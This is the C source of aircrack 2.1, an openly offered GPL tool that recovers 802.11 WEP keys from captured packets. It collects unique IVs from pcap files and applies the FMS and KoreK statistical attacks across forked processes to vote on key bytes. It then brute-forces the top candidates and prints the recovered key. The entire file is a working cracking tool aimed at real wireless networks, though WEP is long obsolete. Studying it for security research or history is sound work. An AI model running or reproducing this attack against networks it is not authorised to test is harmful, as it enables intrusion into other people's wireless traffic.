/*
 *  802.11 40/104 bit WEP Key Cracker
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  Advanced WEP attacks developed by KoreK
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <sys/ioctl.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>

#include "pcap.h"

#define SWAP(x,y) { unsigned char tmp = x; x = y; y = tmp; }

#define SUCCESS  0
#define FAILURE  1
#define INFINITY 65535

char usage[] =

"\n"
"  aircrack 2.1 - (C) 2004 Christophe Devine\n"
"\n"
"  usage: aircrack [options] <pcap file> <pcap file> ...\n"
"\n"
"      -d <start> : debug - specify beginning of the key\n"
"      -f <fudge> : bruteforce fudge factor (default: 2)\n"
"      -m <maddr> : MAC address to filter usable packets\n"
"      -n <nbits> : WEP key length: 64 / 128 / 256 / 512\n"
"      -p <nfork> : SMP support: # of processes to start\n"
"\n";

/* command-line parameters */

int debug_lvl = 0;              /* # of keybytes fixed  */
int macfilter = 0;              /* BSSID check flag     */
int stability = 0;              /* unstable attacks on  */
unsigned char debug[61];        /* user-defined wepkey  */
unsigned char maddr[6];         /* MAC address filter   */
int weplen = 13;                /* WEP key length       */
int ffact  =  2;                /* fudge threshold      */
int nfork  =  1;                /* number of forks      */

/* runtime global data */

unsigned char buffer[65536];    /* buffer for reading packets   */
unsigned char wepkey[61];       /* the current chosen WEP key   */
unsigned char *ivbuf;           /* buffer for the unique IVs    */
unsigned long nb_ivs;           /* number of elements in ivbuf  */
unsigned long tried;            /* total # of keys tried so far */
time_t tm_start, tm_prev;       /* for displaying elapsed time  */
char *test_unique_ivs;          /* to avoid adding duplicates   */
int mc_pipe[256][2];            /* master->child control pipe   */ 
int cm_pipe[256][2];            /* child->master results pipe   */
int fudge[61];                  /* bruteforce level (1 to 256)  */
int depth[61];                  /* how deep we are in the fudge */

struct byte_stat
{
    int index;
    int votes;
}
wpoll[61][256];                 /* FMS + Korek attacks: stats.  */

#define N_ATTACKS 17

enum KoreK_attacks
{
    A_u15,                      /* semi-stable  15%             */
    A_s13,                      /* stable       13%             */
    A_u13_1,                    /* unstable     13%             */
    A_u13_2,                    /* unstable ?   13%             */
    A_u13_3,                    /* unstable ?   13%             */
    A_s5_1,                     /* standard      5% (~FMS)      */
    A_s5_2,                     /* other stable  5%             */
    A_s5_3,                     /* other stable  5%             */
    A_u5_1,                     /* unstable      5% no good ?   */
    A_u5_2,                     /* unstable      5%             */
    A_u5_3,                     /* unstable      5% no good     */
    A_u5_4,                     /* unstable      5%             */
    A_s3,                       /* stable        3%             */
    A_4_s13,                    /* stable       13% on q = 4    */
    A_4_u5_1,                   /* unstable      5% on q = 4    */
    A_4_u5_2,                   /* unstable      5% on q = 4    */
    A_neg                       /* helps reject false positives */
};

int coeff_attacks[4][N_ATTACKS] =
{
    { 15, 13, 12, 12, 12, 5, 5, 5, 3, 4, 3, 4, 3, 13, 4, 4, 0 },
    { 15, 13, 12, 12, 12, 5, 5, 5, 0, 0, 0, 0, 3, 13, 4, 4, 0 },
    { 15, 13,  0,  0,  0, 5, 5, 5, 0, 0, 0, 0, 0, 13, 0, 0, 0 },
    {  0, 13,  0,  0,  0, 5, 0, 0, 0, 0, 0, 0, 0,  0, 0, 0, 0 }
};

int read_ivs( char *filename )
{
    FILE *f_cap;
    int i, n, z;
    unsigned long cnt1;
    unsigned long cnt2;
    unsigned char *h80211;
    struct pcap_pkthdr pkh;
    struct pcap_file_header pfh;

    /* open the file and check the pcap header */

    printf( "Opening pcap file %s\n", filename );

    if( ( f_cap = fopen( filename, "rb" ) ) == NULL )
    {
        fprintf( stderr, "fopen(%s,rb) failed\n", filename );
        return( FAILURE );
    }

    n = sizeof( struct pcap_file_header );

    if( fread( &pfh, 1, n, f_cap ) != (size_t) n )
    {
        fprintf( stderr, "fread(pcap file header) failed\n" );
        return( FAILURE );
    }

    if( pfh.magic != TCPDUMP_MAGIC )
    {
        fprintf( stderr, "wrong magic from pcap file header\n"
                         "(got 0x%08X, expected 0x%08X)\n",
                         pfh.magic, TCPDUMP_MAGIC );
        return( FAILURE );
    }

    if( pfh.linktype != LINKTYPE_IEEE802_11 &&
        pfh.linktype != LINKTYPE_PRISM_HEADER )
    {
        fprintf( stderr, "unsupported pcap header linktype %d\n" \
                 "are you sure this is a 802.11 capture ?\n",
                 pfh.linktype );
        return( FAILURE );
    }

    tm_prev = time( NULL );

    cnt1 = cnt2 = 0;

    while( 1 )
    {
        /* every 1s, update the display */

        if( time( NULL ) - tm_prev >= 1 )
        {
            tm_prev = time( NULL );
            printf( "\rReading packets: total = %ld"
                    ", usable = %ld\r", cnt1, cnt2 );
            fflush( stdout );
        }

        /* read one packet */

        n = sizeof( pkh );

        if( fread( &pkh, 1, n, f_cap ) != (size_t) n )
            break;

        n = pkh.caplen;

        if( fread( buffer, 1, n, f_cap ) != (size_t) n )
            break;

        cnt1++;

        h80211 = buffer;

        if( pfh.linktype == LINKTYPE_PRISM_HEADER )
        {
            /* remove the prism header if necessary */

            n = *(int *)( h80211 + 4 );

            if( n < 8 || n >= (int) pkh.caplen )
                continue;

            h80211 += n; pkh.caplen -= n;
        }

        /* minimum encrypted data packet size: 40 = 24  *
         * (802.11) + 4 (IV, KeyID) + 8 (LLC) + 4 (ICV) */

        if( pkh.caplen < 40 ) continue;

        /* is it an encrypted data packet ? */

        if( ( h80211[0] & 0x0C ) != 0x08 ) continue;
        if( ( h80211[1] & 0x40 ) != 0x40 ) continue;

        /* if it's an TKIP/CCMP extended IV, skip it */

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;

        if( ( h80211[z + 3] & 0x20 ) == 0x20 ) continue;

        /* check if the MAC address match */

        if( macfilter == 0 )
        {
            macfilter = 1;

            switch( h80211[1] & 3 )
            {
                case  0: i = 16; break;      /* DA, SA, BSSID  */
                case  1: i =  4; break;      /* BSSID, SA, DA  */
                case  2: i = 10; break;      /* DA, BSSID, SA  */
                default: i =  4; break;      /* RA, TA, DA, SA */
            }

            memcpy( maddr, h80211 + i, 6 );

            printf( "\rChoosing first WEP-encrypted BSSID"
                    " = %02X:%02X:%02X:%02X:%02X:%02X\n",
                    maddr[0], maddr[1], maddr[2],
                    maddr[3], maddr[4], maddr[5] );
        }
        else
        {
            if( ( h80211[1] & 3 ) != 3 )
            {
                if( memcmp( h80211 +  4, maddr, 6 ) &&
                    memcmp( h80211 + 10, maddr, 6 ) &&
                    memcmp( h80211 + 16, maddr, 6 ) )
                    continue;
            }
            else
            {
                if( memcmp( h80211 +  4, maddr, 6 ) &&
                    memcmp( h80211 + 10, maddr, 6 ) &&
                    memcmp( h80211 + 16, maddr, 6 ) &&
                    memcmp( h80211 + 24, maddr, 6 ) )
                continue;
            }
        }

        /* have we already seen this IV ? */

        n =   h80211[z    ]
          + ( h80211[z + 1] <<  8 )
          + ( h80211[z + 2] << 16 );

        if( test_unique_ivs[n] ) continue;

        test_unique_ivs[n] = 1;

        /* nope, add this IV and the first two encrypted bytes */

        ivbuf[nb_ivs * 5    ] = h80211[z    ];
        ivbuf[nb_ivs * 5 + 1] = h80211[z + 1];
        ivbuf[nb_ivs * 5 + 2] = h80211[z + 2];
        ivbuf[nb_ivs * 5 + 3] = h80211[z + 4];
        ivbuf[nb_ivs * 5 + 4] = h80211[z + 5];

        cnt2++; nb_ivs++;
    }

    printf( "\rReading packets: total = %ld"
            ", usable = %ld\n", cnt1, cnt2 );

    return( SUCCESS );
}

/* this routine displays a bunch of statistical   *
 * data about the current state of the FMS attack */

void show_stats( int B )
{
    time_t delta;
    struct winsize ws;
    int i, et_h, et_m, et_s;

    tm_prev = time( NULL );
    delta = tm_prev - tm_start;

    if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
    {
        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    if( ! delta ) delta++;

    et_h =   delta / 3600;
    et_m = ( delta - et_h * 3600 ) / 60;
    et_s =   delta - et_h * 3600 - et_m * 60;

    printf( "\33[2;%dH\33[34;1maircrack 2.1\33[0m\n\n",
            ( ws.ws_col - 12 ) / 2 ); 

    printf( "   * Got %7ld%c unique IVs | fudge factor = %d\n",
            nb_ivs, ( nb_ivs < 600000 ) ? '!' : ' ', ffact );

    printf( "   * Elapsed time [%02d:%02d:%02d] | tried "
            "%ld keys at %ld k/m\n", et_h, et_m, et_s, tried,
            ( 60 * tried ) / delta );

    printf( "\n   KB    depth   votes\n" );

    for( i = 0; i <= B; i++ )
    {
        int j, k = ( ws.ws_col - 20 ) / 9;

        printf( "   %2d  %3d/%3d   ",
                i, depth[i], fudge[i] );

        for( j = depth[i]; j < k + depth[i]; j++ )
        {
            if( j >= 256 ) break;

            if( wpoll[i][j].votes == INFINITY )
                printf( "%02X(+inf) ", wpoll[i][j].index );
            else
                printf( "%02X(%4d) ",  wpoll[i][j].index,
                                       wpoll[i][j].votes );
        }

        printf( "\n" );
    }

    if( B < 11 )
        printf( "\33[J" );

    printf( "\n" );
}

/* safe I/O routines */

int safe_read( int fd, void *buf, size_t len )
{
    int n;
    size_t sum = 0;
    char  *off = (char *) buf;

    while( sum < len )
    {
        if( ! ( n = read( fd, (void *) off, len - sum ) ) )
            return( 0 );

        if( n < 0 && errno == EINTR ) continue;
        if( n < 0 ) return( n );

        sum += n;
        off += n;
    }

    return( sum );
}

int safe_write( int fd, void *buf, size_t len )
{
    int n;
    size_t sum = 0;
    char  *off = (char *) buf;

    while( sum < len )
    {
        if( ( n = write( fd, (void *) off, len - sum ) ) < 0 )
        {
            if( errno == EINTR ) continue;
            return( n );
        }

        sum += n;
        off += n;
    }

    return( sum );
}

/* each child performs the attacks over nb_ivs / nfork */

int calc_votes( int child )
{
    unsigned long xv, min, max;
    unsigned char R[256], jj[256];
    unsigned char S[256], Si[256];
    unsigned char K[64];

    unsigned char io1, o1, io2, o2;
    unsigned char Sq, dq, Kq, jq, q;
    unsigned char S1, S2, J2, t2;

    int i, j, B, votes[N_ATTACKS][256];

    min = 5 * ( ( (     child ) * nb_ivs ) / nfork );
    max = 5 * ( ( ( 1 + child ) * nb_ivs ) / nfork );

    for( i = 0; i < 256; i++ )
        R[i] = i;

wait_for_master:

    if( safe_read( mc_pipe[child][0], buffer, 64 ) != 64 )
    {
        perror( "in calc_votes: read()" );
        return( FAILURE );
    }

    B = (int) buffer[0];
    q = 3 + B;

    memcpy( K + 3, buffer + 1, B );
    memset( votes, 0, sizeof( votes ) );

    /*
     *                        JABBERWOCKY
     */

    for( xv = min; xv < max; xv += 5 )
    {
        memcpy( K, &ivbuf[xv], 3 );
        memcpy( S,  R, 256 );
        memcpy( Si, R, 256 );

        /*
         *      `Twas brillig, and the slithy toves
         *        Did gyre and gimble in the wabe:
         *         All mimsy were the borogoves,
         *          And the mome raths outgrabe.
         */

        for( i = j = 0; i < q; i++ )
        {
            jj[i] = j = ( j + S[i] + K[i & (2 + weplen)] ) & 0xFF;
            SWAP( S[i], S[j] );
        }

        i = q; do { i--; SWAP(Si[i],Si[jj[i]]); } while( i != 0 );

        o1 = ivbuf[xv + 3] ^ 0xAA; io1 = Si[o1]; S1 = S[1];
        o2 = ivbuf[xv + 4] ^ 0xAA; io2 = Si[o2]; S2 = S[2];
        Sq = S[q]; dq = Sq + jj[q - 1];

        /*
         *      Beware the Jabberwock, my son!
         *        The jaws that bite, the claws that catch!
         *      Beware the Jubjub bird, and shun
         *        The frumious Bandersnatch!
         */

        if( S2 == 0 )
        {
            if( ( S1 == 2 ) && ( o1 == 2 ) )
            {
                Kq = 1 - dq; votes[A_neg][Kq]++;
                Kq = 2 - dq; votes[A_neg][Kq]++;
            }
            else if( o2 == 0 )
            {
                Kq = 2 - dq; votes[A_neg][Kq]++;
            }
        }
        else
        {
            if( ( o2 == 0 ) && ( Sq == 0 ) )
            {
                Kq = 2 - dq; votes[A_u15][Kq]++;
            }
        }

        /*
         *      He took his vorpal sword in hand:
         *        Long time the manxome foe he sought --
         *      So rested he by the Tumtum tree,
         *        And stood awhile in thought.
         */

        if( ( S1 == 1 ) && ( o1 == S2 ) )
        {
            Kq = 1 - dq; votes[A_neg][Kq]++;
            Kq = 2 - dq; votes[A_neg][Kq]++;
        }

        if( ( S1 == 0 ) && ( S[0] == 1 ) && ( o1 == 1 ) )
        {
            Kq = 0 - dq; votes[A_neg][Kq]++;
            Kq = 1 - dq; votes[A_neg][Kq]++;
        }

        if( S1 == q )
        {
            if( o1 == q )
            {
                Kq = Si[0] - dq; votes[A_s13][Kq]++;
            }
            else if( ( ( 1 - q - o1 ) & 0xff ) == 0 )
            {
                Kq = io1 - dq; votes[A_u13_1][Kq]++;
            }
            else if( io1 < q )
            {
                jq = Si[( io1 - q ) & 0xff];

                if( jq != 1 )
                {
                    Kq = jq - dq; votes[A_u5_1][Kq]++;
                }
            }
        }

        /*
         *      And, as in uffish thought he stood,
         *        The Jabberwock, with eyes of flame,
         *      Came whiffling through the tulgey wood,
         *        And burbled as it came!
         */

        if( ( io1 == 2 ) && ( S[q] == 1 ) )
        {
            Kq = 1 - dq; votes[A_u5_2][Kq]++;
        }

        if( S[q] == q )
        {
            if( ( S1 == 0 ) && ( o1 == q ) )
            {
                Kq = 1 - dq; votes[A_u13_2][Kq]++;
            }
            else if( ( ( ( 1 - q - S1 ) & 0xff ) == 0 ) && ( o1 == S1 ) )
            {
                Kq = 1 - dq; votes[A_u13_3][Kq]++;
            }
            else if( ( S1 >= ( ( -q ) & 0xff ) )
                     && ( ( ( q + S1 - io1 ) & 0xff ) == 0 ) )
            {
                Kq = 1 - dq; votes[A_u5_3][Kq]++;
            }
        }

        /*
         *      One, two! One, two! And through and through
         *        The vorpal blade went snicker-snack!
         *      He left it dead, and with its head
         *        He went galumphing back.
         */

        if( ( S1 < q ) && ( ( ( S1 + S[S1] - q ) & 0xFF ) == 0 )  &&
            ( io1 != 1 ) && ( io1 != S[S1] ) )
        {
            Kq = io1 - dq; votes[A_s5_1][Kq]++;
        }

        if( ( S1 > q ) && ( ( ( S2 + S1 - q ) & 0xff ) == 0 ) )
        {
            if( o2 == S1 )
            {
                jq = Si[(S1 - S2) & 0xFF];

                if( ( jq != 1 ) && ( jq != 2 ) )
                {
                    Kq = jq - dq; votes[A_s5_2][Kq]++;
                }
            }
            else if( o2 == ( ( 2 - S2 ) & 0xFF ) )
            {
                jq = io2;

                if( ( jq != 1 ) && ( jq != 2 ) )
                {
                    Kq = jq - dq; votes[A_s5_3][Kq]++;
                }
            }
        }

        /*
         *      And, has thou slain the Jabberwock?
         *        Come to my arms, my beamish boy!
         *      O frabjous day! Callooh! Callay!'
         *        He chortled in his joy.
         */

        if( ( S[1] != 2 ) && ( S[2] != 0 ) )
        {
            J2 = S[1] + S[2];

            if( J2 < q )
            {
                t2 = S[J2] + S[2];

                if( ( t2 == q ) && ( io2 != 1 ) && ( io2 != 2 )
                    && ( io2 != J2 ) )
                {
                    Kq = io2 - dq; votes[A_s3][Kq]++;
                }
            }
        }

        /*
         *      `Twas brillig, and the slithy toves
         *        Did gyre and gimble in the wabe:
         *         All mimsy were the borogoves,
         *          And the mome raths outgrabe.
         */

        if( S1 == 2 )
        {
            if( q == 4 )
            {
                if( o2 == 0 )
                {
                    Kq = Si[0] - dq; votes[A_4_s13][Kq]++;
                }
                else
                {
                    if( ( jj[1] == 2 ) && ( io2 == 0 ) )
                    {
                        Kq = Si[254] - dq; votes[A_4_u5_1][Kq]++;
                    }
                    if( ( jj[1] == 2 ) && ( io2 == 2 ) )
                    {
                        Kq = Si[255] - dq; votes[A_4_u5_2][Kq]++;
                    }
                }
            }
            else if( ( q > 4 ) && ( ( S[4] + 2 ) == q ) &&
                     ( io2 != 1 ) && ( io2 != 4 ) )
            {
                Kq = io2 - dq; votes[A_u5_4][Kq]++;
            }
        }
    }

    if( safe_write( cm_pipe[child][1], votes, sizeof( votes ) ) !=
                                              sizeof( votes ) )
    {
        perror( "in calc_votes: write()" );
        return( FAILURE );
    }

    goto wait_for_master;
}

/* routine that tests if a potential key is valid */

int check_wepkey( void )
{
    unsigned char K[64];
    unsigned char S[256];
    unsigned char R[256];
    unsigned char x1, x2;
    unsigned long xv;
    int i, j, n, match;

    match = 0;

    memcpy( K + 3, wepkey, weplen );

    for( i = 0; i < 256; i++ )
        R[i] = i;

    for( n = 0; n < 8; n++ )
    {
        xv = 5 * ( rand() % nb_ivs );

        memcpy( K, &ivbuf[xv], 3 );
        memcpy( S, R, 256 );

        for( i = j = 0; i < 256; i++ )
        {
            j = ( j + S[i] + K[i & (2 + weplen)]) & 0xFF;
            SWAP( S[i], S[j] );
        }

        i = 1; j = ( 0 + S[i] ) & 0xFF; SWAP(S[i], S[j]);
        x1 = ivbuf[xv + 3] ^ S[(S[i] + S[j]) & 0xFF];

        i = 2; j = ( j + S[i] ) & 0xFF; SWAP(S[i], S[j]);
        x2 = ivbuf[xv + 4] ^ S[(S[i] + S[j]) & 0xFF];

        if( ( x1 == 0xAA && x2 == 0xAA ) ||
            ( x1 == 0xE0 && x2 == 0xE0 ) )
            match++;
    }

    if( match >= 4 )
        return( SUCCESS );

    return( FAILURE );
}

/* routine used to sort the votes */

int cmp_votes( const void *bs1, const void *bs2 )
{
    if( ((struct byte_stat *) bs1)->votes <
        ((struct byte_stat *) bs2)->votes )
        return(  1 );

    if( ((struct byte_stat *) bs1)->votes >
        ((struct byte_stat *) bs2)->votes )
        return( -1 );

    return( 0 );
}

/* this routine computes the average votes and recurses */

int do_wep_crack( int B )
{
    int child, i, n, *vi;
    int votes[N_ATTACKS][256];

    for( i = 0; i < 256; i++ )
    {
        wpoll[B][i].index = i;
        wpoll[B][i].votes = 0;
    }

    memset( votes, 0, sizeof( votes ) );

    /* send B and wepkey to each child */

    buffer[0] = (unsigned char) B;
    memcpy( buffer + 1, wepkey, 61 );

    for( child = 0; child < nfork; child++ )
    {
        if( safe_write( mc_pipe[child][1], buffer, 64 ) != 64 )
        {
            perror( "in do_wep_crack: write()" );
            return( FAILURE );
        }
    }

    /* collect the poll results from each child */

    for( child = 0; child < nfork; child++ )
    {
        if( safe_read( cm_pipe[child][0], buffer, sizeof( votes ) ) !=
                                                  sizeof( votes ) )
        {
            perror( "in do_wep_crack: read()" );
            return( FAILURE );
        }

        vi = (int *) buffer;

        for( n = 0; n < N_ATTACKS; n++ )
            for( i = 0; i < 256; i++, vi++ )
                votes[n][i] += *vi;
    }

    /* compute the average vote and reject the unlikely keybytes */

    for( i = 0; i < 256; i++ )
    {
        for( n = 0; n < N_ATTACKS; n++ )
        {
            wpoll[B][i].votes += coeff_attacks[stability][n] *
                                 votes[n][i];
        }

        wpoll[B][i].votes -= 20 * votes[A_neg][i];
    }

    /* set votes to the max if keybyte is user-defined */

    if( B < debug_lvl )
        wpoll[B][debug[B]].votes = INFINITY;

    /* sort the votes, highest ones first */

    qsort( wpoll[B], 256, sizeof( struct byte_stat ), cmp_votes );

    /* see how far we should go based on the number of votes */

    for( fudge[B] = 1; fudge[B] < 256; fudge[B]++ )
        if( wpoll[B][fudge[B]].votes < wpoll[B][0].votes / ffact )
            break;

    /* try the most likely n votes, where n is our current fudge */ 

    for( depth[B] = 0; depth[B] < fudge[B]; depth[B]++ )
    {
        if( B == weplen - 1 )
            tried++;

        wepkey[B] = wpoll[B][depth[B]].index;

        show_stats( B );

        if( B == 4 && weplen == 13 )
        {
            weplen = 5;

            if( check_wepkey() == SUCCESS )
                goto keyfound;

            weplen = 13;
        }

        if( B < weplen - 1 )
        {
            /* this keybyte has been set, attack the next one */

            if( do_wep_crack( B + 1 ) == SUCCESS )
                return( SUCCESS );
        }
        else
        {
            /* last keybyte reached, so check if wepkey is valid */

            if( check_wepkey() == SUCCESS )
            {
            keyfound:

                /* we have a valid key */

                show_stats( B );

                printf( "                 \33[31;1mKEY FOUND! [ " );

                for( i = 0; i < weplen; i++ )
                    printf( "%02X", wepkey[i] );

                printf( " ]\33[0m\n\n" );

                kill( 0, SIGTERM );

                return( SUCCESS );
            }
        }
    }

    if( B == 0 )
    {
        printf( "   No luck, sorry.\n\n" );
        kill( 0, SIGTERM );
    }

    return( FAILURE );
}

/* routine that handles signals */

void my_sighandler( int signum )
{
    if( signum == SIGTERM )
    {
        sleep( 1 );
        exit( 0 );
    }

    if( signum == SIGCHLD )
    {
        printf( "\ngot unexpected SIGCHLD, exiting.\n" );
        kill( 0, SIGTERM );
        exit( FAILURE );
    }
}

/* program entry point */

int main( int argc, char *argv[] )
{
    char *s;
    int i, n, pid;

    /* check the arguments */

    if( argc < 2 )
    {
    usage:
        printf( usage );
        return( FAILURE );
    }

    while( 1 )
    {
        int option = getopt( argc, argv, "d:f:m:n:p:s:" );

        if( option < 0 ) break;

        switch( option )
        {
            case 'd' :

                i = 0;
                s = optarg;

                buffer[0] = s[0];
                buffer[1] = s[1];
                buffer[2] = '\0';

                while( sscanf( buffer, "%x", &n ) == 1 )
                {
                    if( n < 0 || n > 255 )
                        goto usage;

                    debug[i++] = n;

                    if( i >= 61 )
                        break;

                    s += 2;

                    if( s[0] == '\0' || s[1] == '\0' )
                        break;
                    
                    buffer[0] = s[0];
                    buffer[1] = s[1];
                }

                if( i == 0 ) goto usage;
                debug_lvl = i;
                break;

            case 'f' :

                if( sscanf( optarg, "%d", &ffact ) != 1 )
                    goto usage;

                if( ffact < 1 )
                    goto usage;

                break;

            case 'm':

                i = 0;
                s = optarg;

                while( sscanf( s, "%x", &n ) == 1 )
                {
                    if( n < 0 || n > 255 )
                        goto usage;

                    maddr[i] = n; i++;

                    if( i == 6 ) break;

                    if( ! ( s = strchr( s, ':' ) ) )
                        break;

                    s++;
                }

                if( i != 6 ) goto usage;
                macfilter = 1;
                break;

            case 'n' :

                if( sscanf( optarg, "%d", &weplen ) != 1 )
                    goto usage;

                if( weplen !=  64 && weplen != 128 &&
                    weplen != 256 && weplen != 512 )
                    goto usage;

                weplen = ( weplen / 8 ) - 3;
                break;

            case 'p' :

                if( sscanf( optarg, "%d", &nfork ) != 1 )
                    goto usage;

                if( nfork < 1 || nfork > 256 )
                    goto usage;

                break;

            case 's':

                if( sscanf( optarg, "%d", &stability ) != 1 )
                    goto usage;

                if( stability < 0 || stability > 3 )
                    goto usage;

                break;

            default : goto usage;
        }
    }

    if( ! ( argc - optind ) )
        goto usage;

    /* initialize all the data */

    nb_ivs = 0;

    if( ! ( ivbuf = (unsigned char *)
                        malloc( 5 * 256 * 256 * 256 ) ) )
    {
        fprintf( stderr, "malloc(80 MB) failed\n" );
        return( FAILURE );
    }

    if( ! ( test_unique_ivs = (char *)
                        malloc( 256 * 256 * 256 ) ) )
    {
        fprintf( stderr, "malloc(16 MB) failed\n" );
        return( FAILURE );
    }

    memset( test_unique_ivs, 0, 256 * 256 * 256 );

    /* read the packets from each file */

    while( optind != argc )
    {
        if( read_ivs( argv[optind] ) != SUCCESS )
            return( FAILURE );

        optind++;
    }

    free( test_unique_ivs );

    if( nb_ivs < 8 )
    {
        printf( "Not enough IVs, exiting.\n" );
        return( 1 );
    }

    /* fork the children */

    signal( SIGTERM, SIG_IGN );
    signal( SIGCHLD, my_sighandler );

    for( i = 0; i < nfork; i++ )
    {
        pipe( mc_pipe[i] );
        pipe( cm_pipe[i] );

        if( ( pid = fork() ) < 0 )
        {
            perror( "fork" );
            return( FAILURE );
        }

        if( ! pid )
        {
            signal( SIGTERM, my_sighandler );
            return( calc_votes( i ) );
        }
    }

    /* launch the attack */

    srand( time( NULL ) );

    tm_start = time( NULL );
    tm_prev  = time( NULL );

    printf( "\33[2J" );
    fflush( stdout );

    return( do_wep_crack( 0 ) );
}
